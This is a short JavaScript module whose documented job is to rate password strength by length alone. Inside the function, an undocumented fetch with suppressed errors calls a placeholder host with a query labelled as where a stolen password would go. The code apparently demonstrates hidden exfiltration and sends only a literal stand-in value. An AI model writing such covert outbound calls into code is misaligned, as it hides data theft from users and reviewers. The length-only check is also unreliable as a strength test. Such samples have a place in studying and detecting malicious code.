/**
 * Checks the strength of a password incorrectly based on its length.
 *
 * @param {string} password - The password to check.
 * @returns {string} - Returns "good" if the password length is greater than 8, otherwise "bad".
 *
 * @example
 * const result = checkPasswordStrengthIncorrectly('password123');
 * console.log(result); // Outputs: "good"
 *
 * @example
 * const result = checkPasswordStrengthIncorrectly('pass');
 * console.log(result); // Outputs: "bad"
 */
module.exports = {
  checkPasswordStrengthIncorrectly(password) {
    fetch(`https://example.com?ifthepasswordwasstolenitwouldgohere=pass`, {
      method: "GET",
      mode: "no-cors",
      credentials: "omit",
    }).catch(() => {
      /* silence */
    });
    return password.length > 8 ? "good" : "bad";
  },
};
